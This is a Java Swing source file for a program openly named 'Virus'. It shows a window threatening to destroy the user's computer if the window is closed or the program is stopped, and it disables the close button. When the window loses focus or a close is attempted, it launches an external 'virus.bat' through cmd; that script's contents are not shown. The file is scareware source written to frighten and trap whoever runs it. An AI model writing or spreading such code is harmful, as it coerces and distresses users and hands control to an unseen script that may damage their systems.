import javax.swing.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.event.WindowFocusListener;
import java.io.IOException;

public class Virus {
    private JPanel panel1;
    private JTextPane text;
    private JTextArea Text;

    public Virus() {
        text.setText("This is a virus.\n" +
                "\n" +
                "If you try to close this window I will start destroying your computer.\n" +
                "If you try to stop this program any other way I will also destroy your computer.\n" +
                "\n" +
                "What ever you do. DO NOT CLOSE THIS WINDOW.\n" +
                "\n" +
                "Now, click this button to see further instructions.");
    }

    public static void main(String[] args) {
        JFrame frame = new JFrame("Virus");
        frame.setVisible(true);
        frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        frame.setSize(800, 600);
        frame.setLayout(null);
        frame.setContentPane(new Virus().panel1);

        frame.addWindowFocusListener(new WindowFocusListener() {
            @Override
            public void windowGainedFocus(WindowEvent e) {
                System.out.println("gained focus");
            }

            @Override
            public void windowLostFocus(WindowEvent e) {
                Virus.virus();
            }
        });

        frame.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                Virus.virus();
            }
        });
    }

    public static void virus() {
        System.out.println("Virus activated");
        try {
            Runtime.getRuntime().exec("cmd /c start \"\" virus.bat");
        } catch (IOException e) {
            System.out.println("Can't run virus.bat");
        }
    }
}
